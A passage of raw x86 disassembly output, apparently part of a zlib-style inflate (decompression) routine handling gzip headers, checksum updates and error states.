  4072e6:	f6 44 24 3c 40       	testb  $0x40,0x3c(%esp)
  4072eb:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  4072ef:	89 81 c4 1b 00 00    	mov    %eax,0x1bc4(%ecx)
  4072f5:	0f 84 57 01 00 00    	je     0x407452
  4072fb:	8b 84 24 90 00 00 00 	mov    0x90(%esp),%eax
  407302:	c7 40 18 ef d6 40 00 	movl   $0x40d6ef,0x18(%eax)
  407309:	c7 01 1d 00 00 00    	movl   $0x1d,(%ecx)
  40730f:	b8 1d 00 00 00       	mov    $0x1d,%eax
  407314:	e9 40 ea ff ff       	jmp    0x405d59
  407319:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  407320:	d3 ee                	shr    %cl,%esi
  407322:	8b 4c 24 48          	mov    0x48(%esp),%ecx
  407326:	8b 6c 24 24          	mov    0x24(%esp),%ebp
  40732a:	29 c3                	sub    %eax,%ebx
  40732c:	89 c8                	mov    %ecx,%eax
  40732e:	83 c0 01             	add    $0x1,%eax
  407331:	89 45 68             	mov    %eax,0x68(%ebp)
  407334:	89 44 24 48          	mov    %eax,0x48(%esp)
  407338:	66 89 54 4d 70       	mov    %dx,0x70(%ebp,%ecx,2)
  40733d:	e9 74 f2 ff ff       	jmp    0x4065b6
  407342:	8b 44 24 24          	mov    0x24(%esp),%eax
  407346:	c7 00 10 00 00 00    	movl   $0x10,(%eax)
  40734c:	b8 10 00 00 00       	mov    $0x10,%eax
  407351:	e9 37 eb ff ff       	jmp    0x405e8d
  407356:	8d 76 00             	lea    0x0(%esi),%esi
  407359:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  407360:	89 dd                	mov    %ebx,%ebp
  407362:	89 74 24 3c          	mov    %esi,0x3c(%esp)
  407366:	89 fb                	mov    %edi,%ebx
  407368:	89 ce                	mov    %ecx,%esi
  40736a:	8b 7c 24 24          	mov    0x24(%esp),%edi
  40736e:	e9 2d f0 ff ff       	jmp    0x4063a0
  407373:	89 5c 24 3c          	mov    %ebx,0x3c(%esp)
  407377:	8b 7c 24 24          	mov    0x24(%esp),%edi
  40737b:	89 eb                	mov    %ebp,%ebx
  40737d:	89 f5                	mov    %esi,%ebp
  40737f:	89 ce                	mov    %ecx,%esi
  407381:	e9 1a f0 ff ff       	jmp    0x4063a0
  407386:	8d 76 00             	lea    0x0(%esi),%esi
  407389:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  407390:	89 54 24 08          	mov    %edx,0x8(%esp)
  407394:	89 6c 24 04          	mov    %ebp,0x4(%esp)
  407398:	8b 40 18             	mov    0x18(%eax),%eax
  40739b:	89 54 24 3c          	mov    %edx,0x3c(%esp)
  40739f:	89 04 24             	mov    %eax,(%esp)
  4073a2:	e8 69 13 00 00       	call   0x408710
  4073a7:	8b 54 24 24          	mov    0x24(%esp),%edx
  4073ab:	89 42 18             	mov    %eax,0x18(%edx)
  4073ae:	8b 54 24 3c          	mov    0x3c(%esp),%edx
  4073b2:	e9 d2 f8 ff ff       	jmp    0x406c89
  4073b7:	89 f6                	mov    %esi,%esi
  4073b9:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  4073c0:	89 c2                	mov    %eax,%edx
  4073c2:	89 c1                	mov    %eax,%ecx
  4073c4:	29 c3                	sub    %eax,%ebx
  4073c6:	0f b7 44 24 54       	movzwl 0x54(%esp),%eax
  4073cb:	d3 ee                	shr    %cl,%esi
  4073cd:	80 7c 24 3c 00       	cmpb   $0x0,0x3c(%esp)
  4073d2:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  4073d6:	89 91 c4 1b 00 00    	mov    %edx,0x1bc4(%ecx)
  4073dc:	89 41 40             	mov    %eax,0x40(%ecx)
  4073df:	0f 85 8e 00 00 00    	jne    0x407473
  4073e5:	c7 01 19 00 00 00    	movl   $0x19,(%ecx)
  4073eb:	b8 19 00 00 00       	mov    $0x19,%eax
  4073f0:	e9 64 e9 ff ff       	jmp    0x405d59
  4073f5:	89 54 24 08          	mov    %edx,0x8(%esp)
  4073f9:	89 6c 24 04          	mov    %ebp,0x4(%esp)
  4073fd:	8b 40 18             	mov    0x18(%eax),%eax
  407400:	89 54 24 3c          	mov    %edx,0x3c(%esp)
  407404:	89 04 24             	mov    %eax,(%esp)
  407407:	e8 04 13 00 00       	call   0x408710
  40740c:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  407410:	8b 54 24 3c          	mov    0x3c(%esp),%edx
  407414:	89 41 18             	mov    %eax,0x18(%ecx)
  407417:	e9 5d f6 ff ff       	jmp    0x406a79
  40741c:	8b 84 24 90 00 00 00 	mov    0x90(%esp),%eax
  407423:	c7 40 18 24 d6 40 00 	movl   $0x40d624,0x18(%eax)
  40742a:	8b 44 24 24          	mov    0x24(%esp),%eax
  40742e:	c7 00 1d 00 00 00    	movl   $0x1d,(%eax)
  407434:	b8 1d 00 00 00       	mov    $0x1d,%eax
  407439:	e9 1b e9 ff ff       	jmp    0x405d59
  40743e:	66 90                	xchg   %ax,%ax
  407440:	8b 54 24 24          	mov    0x24(%esp),%edx
  407444:	29 c8                	sub    %ecx,%eax
  407446:	03 42 34             	add    0x34(%edx),%eax
  407449:	89 44 24 40          	mov    %eax,0x40(%esp)
  40744d:	e9 41 eb ff ff       	jmp    0x405f93
  407452:	0f b7 44 24 54       	movzwl 0x54(%esp),%eax
  407457:	8b 54 24 3c          	mov    0x3c(%esp),%edx
  40745b:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  40745f:	83 e2 0f             	and    $0xf,%edx
  407462:	89 41 44             	mov    %eax,0x44(%ecx)
  407465:	89 51 48             	mov    %edx,0x48(%ecx)
  407468:	c7 01 17 00 00 00    	movl   $0x17,(%ecx)
  40746e:	e9 64 ea ff ff       	jmp    0x405ed7
  407473:	f6 44 24 3c 20       	testb  $0x20,0x3c(%esp)
  407478:	0f 84 7e 01 00 00    	je     0x4075fc
  40747e:	8b 44 24 24          	mov    0x24(%esp),%eax
  407482:	c7 80 c4 1b 00 00 ff 	movl   $0xffffffff,0x1bc4(%eax)
  407489:	ff ff ff 
  40748c:	c7 00 0b 00 00 00    	movl   $0xb,(%eax)
  407492:	b8 0b 00 00 00       	mov    $0xb,%eax
  407497:	e9 bd e8 ff ff       	jmp    0x405d59
  40749c:	c7 07 1e 00 00 00    	movl   $0x1e,(%edi)
  4074a2:	b8 fc ff ff ff       	mov    $0xfffffffc,%eax
  4074a7:	e9 c9 ee ff ff       	jmp    0x406375
  4074ac:	89 f0                	mov    %esi,%eax
  4074ae:	8b 5c 24 24          	mov    0x24(%esp),%ebx
  4074b2:	c7 44 24 08 02 00 00 	movl   $0x2,0x8(%esp)
  4074b9:	00 
  4074ba:	88 44 24 6c          	mov    %al,0x6c(%esp)
  4074be:	89 f0                	mov    %esi,%eax
  4074c0:	c1 e8 08             	shr    $0x8,%eax
  4074c3:	88 44 24 6d          	mov    %al,0x6d(%esp)
  4074c7:	8d 44 24 6c          	lea    0x6c(%esp),%eax
  4074cb:	89 44 24 04          	mov    %eax,0x4(%esp)
  4074cf:	8b 43 18             	mov    0x18(%ebx),%eax
  4074d2:	89 04 24             	mov    %eax,(%esp)
  4074d5:	e8 36 12 00 00       	call   0x408710
  4074da:	8b 53 10             	mov    0x10(%ebx),%edx
  4074dd:	89 43 18             	mov    %eax,0x18(%ebx)
  4074e0:	e9 44 f6 ff ff       	jmp    0x406b29
  4074e5:	89 d8                	mov    %ebx,%eax
  4074e7:	89 7c 24 3c          	mov    %edi,0x3c(%esp)
  4074eb:	89 eb                	mov    %ebp,%ebx
  4074ed:	8b 7c 24 24          	mov    0x24(%esp),%edi
  4074f1:	89 f5                	mov    %esi,%ebp
  4074f3:	89 c6                	mov    %eax,%esi
  4074f5:	e9 a6 ee ff ff       	jmp    0x4063a0
  4074fa:	8b 84 24 90 00 00 00 	mov    0x90(%esp),%eax
  407501:	c7 40 18 80 d5 40 00 	movl   $0x40d580,0x18(%eax)
  407508:	8b 44 24 24          	mov    0x24(%esp),%eax
  40750c:	c7 00 1d 00 00 00    	movl   $0x1d,(%eax)
  407512:	b8 1d 00 00 00       	mov    $0x1d,%eax
  407517:	e9 3d e8 ff ff       	jmp    0x405d59
  40751c:	83 bc 24 94 00 00 00 	cmpl   $0x6,0x94(%esp)
  407523:	06 
  407524:	8b 44 24 24          	mov    0x24(%esp),%eax
  407528:	c7 40 4c 80 d8 40 00 	movl   $0x40d880,0x4c(%eax)
  40752f:	c7 40 54 09 00 00 00 	movl   $0x9,0x54(%eax)
  407536:	c7 40 50 00 d8 40 00 	movl   $0x40d800,0x50(%eax)
  40753d:	c7 40 58 05 00 00 00 	movl   $0x5,0x58(%eax)
  407544:	c7 00 13 00 00 00    	movl   $0x13,(%eax)
  40754a:	0f 84 9f 05 00 00    	je     0x407aef
  407550:	b8 13 00 00 00       	mov    $0x13,%eax
  407555:	e9 33 e9 ff ff       	jmp    0x405e8d
  40755a:	8b 84 24 90 00 00 00 	mov    0x90(%esp),%eax
  407561:	c7 40 18 f3 d5 40 00 	movl   $0x40d5f3,0x18(%eax)
  407568:	8b 44 24 24          	mov    0x24(%esp),%eax
  40756c:	c7 00 1d 00 00 00    	movl   $0x1d,(%eax)
  407572:	b8 1d 00 00 00       	mov    $0x1d,%eax
  407577:	e9 11 e9 ff ff       	jmp    0x405e8d
  40757c:	8b 44 24 40          	mov    0x40(%esp),%eax
  407580:	89 6c 24 04          	mov    %ebp,0x4(%esp)
  407584:	89 44 24 08          	mov    %eax,0x8(%esp)
  407588:	8b 44 24 24          	mov    0x24(%esp),%eax
  40758c:	8b 40 18             	mov    0x18(%eax),%eax
  40758f:	89 04 24             	mov    %eax,(%esp)
  407592:	e8 79 11 00 00       	call   0x408710
  407597:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  40759b:	89 41 18             	mov    %eax,0x18(%ecx)
  40759e:	e9 ec f3 ff ff       	jmp    0x40698f
  4075a3:	89 74 24 3c          	mov    %esi,0x3c(%esp)
  4075a7:	89 de                	mov    %ebx,%esi
  4075a9:	89 eb                	mov    %ebp,%ebx
  4075ab:	89 fd                	mov    %edi,%ebp
  4075ad:	89 c7                	mov    %eax,%edi
  4075af:	e9 ec ed ff ff       	jmp    0x4063a0
  4075b4:	89 f0                	mov    %esi,%eax
  4075b6:	8b 5c 24 24          	mov    0x24(%esp),%ebx
  4075ba:	c7 44 24 08 04 00 00 	movl   $0x4,0x8(%esp)
  4075c1:	00 
  4075c2:	88 44 24 6c          	mov    %al,0x6c(%esp)
  4075c6:	89 f0                	mov    %esi,%eax
  4075c8:	c1 e8 08             	shr    $0x8,%eax
  4075cb:	88 44 24 6d          	mov    %al,0x6d(%esp)
  4075cf:	89 f0                	mov    %esi,%eax
  4075d1:	c1 e8 10             	shr    $0x10,%eax
  4075d4:	88 44 24 6e          	mov    %al,0x6e(%esp)
  4075d8:	89 f0                	mov    %esi,%eax
  4075da:	c1 e8 18             	shr    $0x18,%eax
  4075dd:	88 44 24 6f          	mov    %al,0x6f(%esp)
  4075e1:	8d 44 24 6c          	lea    0x6c(%esp),%eax
  4075e5:	89 44 24 04          	mov    %eax,0x4(%esp)
  4075e9:	8b 43 18             	mov    0x18(%ebx),%eax
  4075ec:	89 04 24             	mov    %eax,(%esp)
  4075ef:	e8 1c 11 00 00       	call   0x408710
  4075f4:	89 43 18             	mov    %eax,0x18(%ebx)
  4075f7:	e9 21 ef ff ff       	jmp    0x40651d
  4075fc:	f6 44 24 3c 40       	testb  $0x40,0x3c(%esp)
  407601:	0f 84 c5 01 00 00    	je     0x4077cc
  407607:	8b 84 24 90 00 00 00 	mov    0x90(%esp),%eax
  40760e:	c7 40 18 d3 d6 40 00 	movl   $0x40d6d3,0x18(%eax)
  407615:	8b 44 24 24          	mov    0x24(%esp),%eax
  407619:	c7 00 1d 00 00 00    	movl   $0x1d,(%eax)
  40761f:	b8 1d 00 00 00       	mov    $0x1d,%eax
  407624:	e9 30 e7 ff ff       	jmp    0x405d59
  407629:	83 bc 24 94 00 00 00 	cmpl   $0x6,0x94(%esp)
  407630:	06 
  407631:	8b 5c 24 24          	mov    0x24(%esp),%ebx
  407635:	89 43 40             	mov    %eax,0x40(%ebx)
  407638:	c7 03 0e 00 00 00    	movl   $0xe,(%ebx)
  40763e:	0f 84 94 04 00 00    	je     0x407ad8
  407644:	31 db                	xor    %ebx,%ebx
  407646:	31 f6                	xor    %esi,%esi
  407648:	e9 ea ee ff ff       	jmp    0x406537
  40764d:	f7 c6 00 e0 00 00    	test   $0xe000,%esi
  407653:	0f 84 8c 01 00 00    	je     0x4077e5
  407659:	8b 84 24 90 00 00 00 	mov    0x90(%esp),%eax
  407660:	c7 40 18 c6 d5 40 00 	movl   $0x40d5c6,0x18(%eax)
  407667:	8b 44 24 24          	mov    0x24(%esp),%eax
  40766b:	c7 00 1d 00 00 00    	movl   $0x1d,(%eax)
  407671:	b8 1d 00 00 00       	mov    $0x1d,%eax
  407676:	e9 de e6 ff ff       	jmp    0x405d59
  40767b:	89 f0                	mov    %esi,%eax
  40767d:	8b 5c 24 24          	mov    0x24(%esp),%ebx
  407681:	c7 44 24 08 02 00 00 	movl   $0x2,0x8(%esp)
  407688:	00 
  407689:	88 44 24 6c          	mov    %al,0x6c(%esp)
  40768d:	89 f0                	mov    %esi,%eax
  40768f:	31 f6                	xor    %esi,%esi
  407691:	c1 e8 08             	shr    $0x8,%eax
  407694:	88 44 24 6d          	mov    %al,0x6d(%esp)
  407698:	8d 44 24 6c          	lea    0x6c(%esp),%eax
  40769c:	89 44 24 04          	mov    %eax,0x4(%esp)
  4076a0:	8b 43 18             	mov    0x18(%ebx),%eax
  4076a3:	89 04 24             	mov    %eax,(%esp)
  4076a6:	e8 65 10 00 00       	call   0x408710
  4076ab:	89 da                	mov    %ebx,%edx
  4076ad:	89 43 18             	mov    %eax,0x18(%ebx)
  4076b0:	31 db                	xor    %ebx,%ebx
  4076b2:	8b 52 10             	mov    0x10(%edx),%edx
  4076b5:	e9 a3 ec ff ff       	jmp    0x40635d
  4076ba:	8d 50 02             	lea    0x2(%eax),%edx
  4076bd:	39 d3                	cmp    %edx,%ebx
  4076bf:	73 35                	jae    0x4076f6
  4076c1:	85 ff                	test   %edi,%edi
  4076c3:	74 7a                	je     0x40773f
  4076c5:	89 d9                	mov    %ebx,%ecx
  4076c7:	8b 6c 24 44          	mov    0x44(%esp),%ebp
  4076cb:	89 c3                	mov    %eax,%ebx
  4076cd:	89 d0                	mov    %edx,%eax
  4076cf:	eb 08                	jmp    0x4076d9
  4076d1:	85 ff                	test   %edi,%edi
  4076d3:	0f 84 47 f9 ff ff    	je     0x407020
  4076d9:	83 c5 01             	add    $0x1,%ebp
  4076dc:	0f b6 55 ff          	movzbl -0x1(%ebp),%edx
  4076e0:	83 ef 01             	sub    $0x1,%edi
  4076e3:	d3 e2                	shl    %cl,%edx
  4076e5:	83 c1 08             	add    $0x8,%ecx
  4076e8:	01 d6                	add    %edx,%esi
  4076ea:	39 c1                	cmp    %eax,%ecx
  4076ec:	72 e3                	jb     0x4076d1
  4076ee:	89 d8                	mov    %ebx,%eax
  4076f0:	89 6c 24 44          	mov    %ebp,0x44(%esp)
  4076f4:	89 cb                	mov    %ecx,%ebx
  4076f6:	89 c1                	mov    %eax,%ecx
  4076f8:	29 c3                	sub    %eax,%ebx
  4076fa:	8b 44 24 48          	mov    0x48(%esp),%eax
  4076fe:	d3 ee                	shr    %cl,%esi
  407700:	85 c0                	test   %eax,%eax
  407702:	0f 84 aa 03 00 00    	je     0x407ab2
  407708:	8b 44 24 24          	mov    0x24(%esp),%eax
  40770c:	8b 4c 24 48          	mov    0x48(%esp),%ecx
  407710:	83 eb 02             	sub    $0x2,%ebx
  407713:	0f b7 54 48 6e       	movzwl 0x6e(%eax,%ecx,2),%edx
  407718:	89 f1                	mov    %esi,%ecx
  40771a:	c1 ee 02             	shr    $0x2,%esi
  40771d:	83 e1 03             	and    $0x3,%ecx
  407720:	8d 41 03             	lea    0x3(%ecx),%eax
  407723:	89 c1                	mov    %eax,%ecx
  407725:	e9 a7 ef ff ff       	jmp    0x4066d1
  40772a:	66 89 4c 24 54       	mov    %cx,0x54(%esp)
  40772f:	0f b6 4c 24 48       	movzbl 0x48(%esp),%ecx
  407734:	2b 5c 24 44          	sub    0x44(%esp),%ebx
  407738:	d3 ee                	shr    %cl,%esi
  40773a:	e9 83 fc ff ff       	jmp    0x4073c2
  40773f:	89 74 24 3c          	mov    %esi,0x3c(%esp)
  407743:	89 fd                	mov    %edi,%ebp
  407745:	89 de                	mov    %ebx,%esi
  407747:	8b 7c 24 24          	mov    0x24(%esp),%edi
  40774b:	8b 5c 24 44          	mov    0x44(%esp),%ebx
  40774f:	e9 4c ec ff ff       	jmp    0x4063a0
  407754:	8b 5c 24 3c          	mov    0x3c(%esp),%ebx
  407758:	89 fd                	mov    %edi,%ebp
  40775a:	89 74 24 3c          	mov    %esi,0x3c(%esp)
  40775e:	8b 7c 24 24          	mov    0x24(%esp),%edi
  407762:	89 ce                	mov    %ecx,%esi
  407764:	e9 37 ec ff ff       	jmp    0x4063a0
  407769:	8d 48 03             	lea    0x3(%eax),%ecx
  40776c:	39 cb                	cmp    %ecx,%ebx
  40776e:	89 ca                	mov    %ecx,%edx
  407770:	73 35                	jae    0x4077a7
  407772:	85 ff                	test   %edi,%edi
  407774:	74 c9                	je     0x40773f
  407776:	89 d9                	mov    %ebx,%ecx
  407778:	8b 6c 24 44          	mov    0x44(%esp),%ebp
  40777c:	89 c3                	mov    %eax,%ebx
  40777e:	89 d0                	mov    %edx,%eax
  407780:	eb 08                	jmp    0x40778a
  407782:	85 ff                	test   %edi,%edi
  407784:	0f 84 96 f8 ff ff    	je     0x407020
  40778a:	83 c5 01             	add    $0x1,%ebp
  40778d:	0f b6 55 ff          	movzbl -0x1(%ebp),%edx
  407791:	83 ef 01             	sub    $0x1,%edi
  407794:	d3 e2                	shl    %cl,%edx
  407796:	83 c1 08             	add    $0x8,%ecx
  407799:	01 d6                	add    %edx,%esi
  40779b:	39 c1                	cmp    %eax,%ecx
  40779d:	72 e3                	jb     0x407782
  40779f:	89 d8                	mov    %ebx,%eax
  4077a1:	89 6c 24 44          	mov    %ebp,0x44(%esp)
  4077a5:	89 cb                	mov    %ecx,%ebx
  4077a7:	89 c1                	mov    %eax,%ecx
  4077a9:	d3 ee                	shr    %cl,%esi
  4077ab:	89 f1                	mov    %esi,%ecx
  4077ad:	89 f2                	mov    %esi,%edx
  4077af:	83 e1 07             	and    $0x7,%ecx
  4077b2:	8d 71 03             	lea    0x3(%ecx),%esi
  4077b5:	89 f1                	mov    %esi,%ecx
  4077b7:	89 d6                	mov    %edx,%esi
  4077b9:	ba fd ff ff ff       	mov    $0xfffffffd,%edx
  4077be:	29 c2                	sub    %eax,%edx
  4077c0:	c1 ee 03             	shr    $0x3,%esi
  4077c3:	01 d3                	add    %edx,%ebx
  4077c5:	31 d2                	xor    %edx,%edx
  4077c7:	e9 05 ef ff ff       	jmp    0x4066d1
  4077cc:	8b 54 24 3c          	mov    0x3c(%esp),%edx
  4077d0:	8b 44 24 24          	mov    0x24(%esp),%eax
  4077d4:	83 e2 0f             	and    $0xf,%edx
  4077d7:	c7 00 15 00 00 00    	movl   $0x15,(%eax)
  4077dd:	89 50 48             	mov    %edx,0x48(%eax)
  4077e0:	e9 85 e9 ff ff       	jmp    0x40616a
  4077e5:	8b 44 24 24          	mov    0x24(%esp),%eax
  4077e9:	8b 40 20             	mov    0x20(%eax),%eax
  4077ec:	85 c0                	test   %eax,%eax
  4077ee:	74 0a                	je     0x4077fa
  4077f0:	89 f2                	mov    %esi,%edx
  4077f2:	c1 ea 08             	shr    $0x8,%edx
  4077f5:	83 e2 01             	and    $0x1,%edx
  4077f8:	89 10                	mov    %edx,(%eax)
  4077fa:	f7 c6 00 02 00 00    	test   $0x200,%esi
  407800:	0f 85 e1 00 00 00    	jne    0x4078e7
  407806:	8b 44 24 24          	mov    0x24(%esp),%eax
  40780a:	31 f6                	xor    %esi,%esi
  40780c:	31 db                	xor    %ebx,%ebx
  40780e:	c7 00 02 00 00 00    	movl   $0x2,(%eax)
  407814:	e9 be ec ff ff       	jmp    0x4064d7
  407819:	29 c2                	sub    %eax,%edx
  40781b:	8b 44 24 24          	mov    0x24(%esp),%eax
  40781f:	89 54 24 04          	mov    %edx,0x4(%esp)
  407823:	8b 40 18             	mov    0x18(%eax),%eax
  407826:	89 04 24             	mov    %eax,(%esp)
  407829:	e8 92 09 00 00       	call   0x4081c0
  40782e:	e9 62 f7 ff ff       	jmp    0x406f95
  407833:	89 74 24 3c          	mov    %esi,0x3c(%esp)
  407837:	89 de                	mov    %ebx,%esi
  407839:	89 eb                	mov    %ebp,%ebx
  40783b:	89 fd                	mov    %edi,%ebp
  40783d:	8b 7c 24 24          	mov    0x24(%esp),%edi
  407841:	c7 07 1c 00 00 00    	movl   $0x1c,(%edi)
  407847:	c7 44 24 38 01 00 00 	movl   $0x1,0x38(%esp)
  40784e:	00 
  40784f:	e9 4c eb ff ff       	jmp    0x4063a0
  407854:	8b 44 24 24          	mov    0x24(%esp),%eax
  407858:	c7 44 24 48 00 00 00 	movl   $0x0,0x48(%esp)
  40785f:	00 
  407860:	c7 40 68 00 00 00 00 	movl   $0x0,0x68(%eax)
  407867:	c7 00 12 00 00 00    	movl   $0x12,(%eax)
  40786d:	e9 2e ed ff ff       	jmp    0x4065a0
  407872:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  407876:	8b 6c 24 44          	mov    0x44(%esp),%ebp
  40787a:	8b 01                	mov    (%ecx),%eax
  40787c:	83 f8 1d             	cmp    $0x1d,%eax
  40787f:	0f 84 d4 e4 ff ff    	je     0x405d59
  407885:	66 83 b9 70 02 00 00 	cmpw   $0x0,0x270(%ecx)
  40788c:	00 
  40788d:	89 c8                	mov    %ecx,%eax
  40788f:	0f 85 70 01 00 00    	jne    0x407a05
  407895:	8b 8c 24 90 00 00 00 	mov    0x90(%esp),%ecx
  40789c:	c7 41 18 7c d6 40 00 	movl   $0x40d67c,0x18(%ecx)
  4078a3:	c7 00 1d 00 00 00    	movl   $0x1d,(%eax)
  4078a9:	b8 1d 00 00 00       	mov    $0x1d,%eax
  4078ae:	e9 a6 e4 ff ff       	jmp    0x405d59
  4078b3:	89 f2                	mov    %esi,%edx
  4078b5:	8b 4c 24 30          	mov    0x30(%esp),%ecx
  4078b9:	89 de                	mov    %ebx,%esi
  4078bb:	89 eb                	mov    %ebp,%ebx
  4078bd:	89 fd                	mov    %edi,%ebp
  4078bf:	89 c7                	mov    %eax,%edi
  4078c1:	8b 84 24 90 00 00 00 	mov    0x90(%esp),%eax
  4078c8:	89 48 0c             	mov    %ecx,0xc(%eax)
  4078cb:	8b 4c 24 28          	mov    0x28(%esp),%ecx
  4078cf:	89 18                	mov    %ebx,(%eax)
  4078d1:	89 68 04             	mov    %ebp,0x4(%eax)
  4078d4:	89 48 10             	mov    %ecx,0x10(%eax)
  4078d7:	89 57 38             	mov    %edx,0x38(%edi)
  4078da:	b8 02 00 00 00       	mov    $0x2,%eax
  4078df:	89 77 3c             	mov    %esi,0x3c(%edi)
  4078e2:	e9 8e ea ff ff       	jmp    0x406375
  4078e7:	89 f0                	mov    %esi,%eax
  4078e9:	8b 5c 24 24          	mov    0x24(%esp),%ebx
  4078ed:	c7 44 24 08 02 00 00 	movl   $0x2,0x8(%esp)
  4078f4:	00 
  4078f5:	88 44 24 6c          	mov    %al,0x6c(%esp)
  4078f9:	89 f0                	mov    %esi,%eax
  4078fb:	c1 e8 08             	shr    $0x8,%eax
  4078fe:	88 44 24 6d          	mov    %al,0x6d(%esp)
  407902:	8d 44 24 6c          	lea    0x6c(%esp),%eax
  407906:	89 44 24 04          	mov    %eax,0x4(%esp)
  40790a:	8b 43 18             	mov    0x18(%ebx),%eax
  40790d:	89 04 24             	mov    %eax,(%esp)
  407910:	e8 fb 0d 00 00       	call   0x408710
  407915:	89 43 18             	mov    %eax,0x18(%ebx)
  407918:	e9 e9 fe ff ff       	jmp    0x407806
  40791d:	89 eb                	mov    %ebp,%ebx
  40791f:	31 f6                	xor    %esi,%esi
  407921:	89 fd                	mov    %edi,%ebp
  407923:	c7 44 24 3c 00 00 00 	movl   $0x0,0x3c(%esp)
  40792a:	00 
  40792b:	8b 7c 24 24          	mov    0x24(%esp),%edi
  40792f:	e9 0d ff ff ff       	jmp    0x407841
  407934:	8b 44 24 24          	mov    0x24(%esp),%eax
  407938:	c1 ee 04             	shr    $0x4,%esi
  40793b:	89 f1                	mov    %esi,%ecx
  40793d:	83 e1 0f             	and    $0xf,%ecx
  407940:	8b 40 24             	mov    0x24(%eax),%eax
  407943:	83 c1 08             	add    $0x8,%ecx
  407946:	85 c0                	test   %eax,%eax
  407948:	0f 85 37 01 00 00    	jne    0x407a85
  40794e:	8b 44 24 24          	mov    0x24(%esp),%eax
  407952:	89 48 24             	mov    %ecx,0x24(%eax)
  407955:	8b 5c 24 24          	mov    0x24(%esp),%ebx
  407959:	b8 01 00 00 00       	mov    $0x1,%eax
  40795e:	81 e6 00 02 00 00    	and    $0x200,%esi
  407964:	d3 e0                	shl    %cl,%eax
  407966:	89 43 14             	mov    %eax,0x14(%ebx)
  407969:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  407970:	00 
  407971:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  407978:	00 
  407979:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  407980:	e8 3b 08 00 00       	call   0x4081c0
  407985:	8b 8c 24 90 00 00 00 	mov    0x90(%esp),%ecx
  40798c:	83 fe 01             	cmp    $0x1,%esi
  40798f:	89 43 18             	mov    %eax,0x18(%ebx)
  407992:	89 41 30             	mov    %eax,0x30(%ecx)
  407995:	19 c0                	sbb    %eax,%eax
  407997:	31 f6                	xor    %esi,%esi
  407999:	83 e0 02             	and    $0x2,%eax
  40799c:	83 c0 09             	add    $0x9,%eax
  40799f:	89 03                	mov    %eax,(%ebx)
  4079a1:	31 db                	xor    %ebx,%ebx
  4079a3:	e9 a8 e3 ff ff       	jmp    0x405d50
  4079a8:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  4079af:	00 
  4079b0:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  4079b7:	00 
  4079b8:	66 31 f6             	xor    %si,%si
  4079bb:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  4079c2:	e8 49 0d 00 00       	call   0x408710
  4079c7:	8b 5c 24 24          	mov    0x24(%esp),%ebx
  4079cb:	8d 54 24 6c          	lea    0x6c(%esp),%edx
  4079cf:	c6 44 24 6c 1f       	movb   $0x1f,0x6c(%esp)
  4079d4:	c6 44 24 6d 8b       	movb   $0x8b,0x6d(%esp)
  4079d9:	89 43 18             	mov    %eax,0x18(%ebx)
  4079dc:	c7 44 24 08 02 00 00 	movl   $0x2,0x8(%esp)
  4079e3:	00 
  4079e4:	89 54 24 04          	mov    %edx,0x4(%esp)
  4079e8:	89 04 24             	mov    %eax,(%esp)
  4079eb:	e8 20 0d 00 00       	call   0x408710
  4079f0:	c7 03 01 00 00 00    	movl   $0x1,(%ebx)
  4079f6:	89 43 18             	mov    %eax,0x18(%ebx)
  4079f9:	b8 01 00 00 00       	mov    $0x1,%eax
  4079fe:	31 db                	xor    %ebx,%ebx
  407a00:	e9 54 e3 ff ff       	jmp    0x405d59
  407a05:	8b 44 24 24          	mov    0x24(%esp),%eax
  407a09:	8b 54 24 50          	mov    0x50(%esp),%edx
  407a0d:	8b 4c 24 4c          	mov    0x4c(%esp),%ecx
  407a11:	89 50 6c             	mov    %edx,0x6c(%eax)
  407a14:	89 50 4c             	mov    %edx,0x4c(%eax)
  407a17:	8d 50 6c             	lea    0x6c(%eax),%edx
  407a1a:	c7 40 54 09 00 00 00 	movl   $0x9,0x54(%eax)
  407a21:	89 4c 24 14          	mov    %ecx,0x14(%esp)
  407a25:	89 c1                	mov    %eax,%ecx
  407a27:	83 c0 54             	add    $0x54,%eax
  407a2a:	89 54 24 0c          	mov    %edx,0xc(%esp)
  407a2e:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
  407a35:	89 44 24 10          	mov    %eax,0x10(%esp)
  407a39:	8b 44 24 58          	mov    0x58(%esp),%eax
  407a3d:	89 54 24 3c          	mov    %edx,0x3c(%esp)
  407a41:	89 44 24 08          	mov    %eax,0x8(%esp)
  407a45:	89 c8                	mov    %ecx,%eax
  407a47:	83 c0 70             	add    $0x70,%eax
  407a4a:	89 44 24 04          	mov    %eax,0x4(%esp)
  407a4e:	e8 cd 0f 00 00       	call   0x408a20
  407a53:	85 c0                	test   %eax,%eax
  407a55:	89 44 24 38          	mov    %eax,0x38(%esp)
  407a59:	8b 54 24 3c          	mov    0x3c(%esp),%edx
  407a5d:	0f 84 a7 00 00 00    	je     0x407b0a
  407a63:	8b 44 24 24          	mov    0x24(%esp),%eax
  407a67:	8b 94 24 90 00 00 00 	mov    0x90(%esp),%edx
  407a6e:	c7 42 18 a1 d6 40 00 	movl   $0x40d6a1,0x18(%edx)
  407a75:	c7 00 1d 00 00 00    	movl   $0x1d,(%eax)
  407a7b:	b8 1d 00 00 00       	mov    $0x1d,%eax
  407a80:	e9 d4 e2 ff ff       	jmp    0x405d59
  407a85:	39 c1                	cmp    %eax,%ecx
  407a87:	0f 86 c8 fe ff ff    	jbe    0x407955
  407a8d:	8b 84 24 90 00 00 00 	mov    0x90(%esp),%eax
  407a94:	83 eb 04             	sub    $0x4,%ebx
